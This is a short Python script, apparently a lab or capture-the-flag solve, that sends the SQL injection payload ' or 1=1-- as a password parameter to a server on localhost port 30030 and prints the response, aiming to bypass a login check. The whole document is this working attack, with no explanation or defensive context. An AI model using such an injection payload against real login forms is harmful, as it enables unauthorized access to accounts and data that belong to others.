import requests

url = "http://127.0.0.1:30030"
data = {
    "password":"' or 1=1--"
}
response = requests.get(url=url, params=data)
print(response.text)